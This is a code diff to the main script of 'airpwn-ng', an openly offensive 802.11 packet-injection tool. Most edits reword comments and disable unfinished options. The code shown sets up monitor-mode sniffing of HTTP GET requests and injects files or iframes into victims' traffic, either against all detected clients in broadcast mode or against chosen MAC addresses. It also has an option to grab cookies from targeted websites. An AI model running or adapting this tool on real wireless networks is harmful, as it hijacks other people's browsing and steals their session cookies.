@@ -17,9 +17,9 @@ class bcolors:
     UNDERLINE = '\033[4m'
 
 
-#
-# Handle CTRL+C
-#
+'''
+Handle CTRL+C
+'''
 def signal_handler(signal, frame):
         print(bcolors.FAIL+'\n[!] Stopping injection and exiting airpwn-ng ...')
         sys.exit(0)
@@ -27,11 +27,11 @@ def signal_handler(signal, frame):
 #ADD GLOBAL SIGNAL HANDLER
 signal.signal(signal.SIGINT, signal_handler)
 
-#
-# Processes injection file and returns a hex encoded payload
-#
 
-
+'''
+Load websites from a file to a List
+object, ignoring lines starting with #
+'''
 def load_websites_targeted(websites_file):
 	websites=[]
 	f = open(websites_file,'r')
@@ -41,7 +41,12 @@ def load_websites_targeted(websites_file):
 	f.close()
 	return websites
 
-
+'''
+Main function.
+This sets up VictimParameters, PacketHandler and
+Victims (if any) and uses the library classes and functions
+according to what arguments are provided
+'''
 def main(args):
 	print "\n\nairpwn-ng - the new and improved 802.11 packet injector\n\n"
 
@@ -54,6 +59,7 @@ def main(args):
 	m_iface = args.m
 	i_iface = args.i
 
+	#SEND OUT SOME WARNINGS
 	if ("mon" in m_iface and m_iface!=i_iface):
 		print bcolors.WARNING+"[!] It appears you are using a monitor mode interface as your monitoring input. If you are attacking open wireless networks, please use the same monitoring interface with -i for better performance."+bcolors.ENDC
 
@@ -77,9 +83,7 @@ def main(args):
 			exit(1)
 		print bcolors.OKGREEN+"[+] Loaded injection file",args.injection+bcolors.ENDC
 		injection=1
-	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY
-	#### Create what on the fly?  Do we have a template for the base?  i.e....
-	#### Is there an iframe template, etc...
+	#USE WEBSITE LIST AND CREATE INJECTIONS ON THE FLY -- CHECK LIB/AIRPWN_NG.PY FOR MORE INFO
 	else:
 		#CHECK IF WEBSITES FILE EXISTS
 		try:
@@ -87,16 +91,16 @@ def main(args):
 			f.close()
 		except:
 			print bcolors.FAIL+"[!] Selected websites file",args.websites,"does not exist."+bcolors.ENDC
-			exit(1)	
+			exit(1)
 		injection=0
 		websites=load_websites_targeted(args.websites)
 		for website in websites:
 			print bcolors.OKGREEN+"[+] Loaded target website ",website+bcolors.ENDC
 
 	# BROADCAST MODE
-	#### Nests suck, no way to "case???"
 	if (args.t is None):
 		print bcolors.WARNING+"[!] You are starting your attack in broadcast mode. This means you will inject packets into all clients you are able to detect. Use with caution."+bcolors.ENDC
+		#FILE INJECTION
 		if (injection==0):
 			vp=AIRPWN_NG.VictimParameters(websites=websites)
 			if (args.exclude_hosts is None):
@@ -109,6 +113,7 @@ def main(args):
 			else:
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
 				snif.threaded_sniff()
+		#WEBSITES IFRAME INJECTION
 		else:
 			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
 			if (args.exclude_hosts is None):
@@ -129,7 +134,7 @@ def main(args):
 		else:
 			for target in args.t:
 				print bcolors.OKGREEN+"[+] Adding target",target+bcolors.ENDC
-
+		#FILE INJECTION
 		if (injection==0):
 			victims=[]
 			vp=AIRPWN_NG.VictimParameters(websites=websites)
@@ -146,6 +151,7 @@ def main(args):
 			else:
 				snif=AIRPWN_NG.Sniffer(ph,m=m_iface,filter='tcp[((tcp[12:1] & 0xf0) >> 2):4] = 0x47455420')
 				snif.threaded_sniff()			
+		#WEBSITES IFRAME INJECTION
 		else:
 			victims=[]
 			vp=AIRPWN_NG.VictimParameters(inject_file=args.injection)
@@ -164,7 +170,6 @@ def main(args):
 				snif.threaded_sniff()
 
 
-#### I forget what this is called, but what the hell does it mean?
 if __name__ == '__main__':
 	
         #ARGUMENT PARSING
@@ -179,19 +184,15 @@ if __name__ == '__main__':
 
         parser.add_argument('-t',nargs='*',metavar='<MAC address>',help='Target MAC addresses')
 
-        #### An example list of how to be done would be helpful here:
-        #### 127.0.0.1, 192.168.0.0/24, 192.168.1.100-200, 192-197.123.123.0/24, etc...
-        parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='List of hosts to exclude from injection')
+        parser.add_argument('--exclude-hosts',nargs='*',metavar='<host>',help='Space separated list of hosts/IP addresses to exclude from injection')
 
-        parser.add_argument('-o',metavar='<outfile>',help='Output File')
+	#### NOT IMPLEMENTED YET
+#        parser.add_argument('-o',metavar='<outfile>',help='Output File')
 
-        #### Number of cookies...  So like if the browser has 5 cookies for a domain, and you specify 4, then it only grabs 4?
-        #### If true to above, then only the first four?  Random four, etc...
-        #### Description needed
         parser.add_argument('-c',metavar='<count>',help='Number of cookies to grab per website on the --websites list')
 
-        #### Describe covert...
-        parser.add_argument('--covert',action='store_true',help='Uses less packets')
+        #### NOT IMPLEMENTED YET
+#        parser.add_argument('--covert',action='store_true',help='Uses less packets')
         args = parser.parse_args()
         main(args)
 
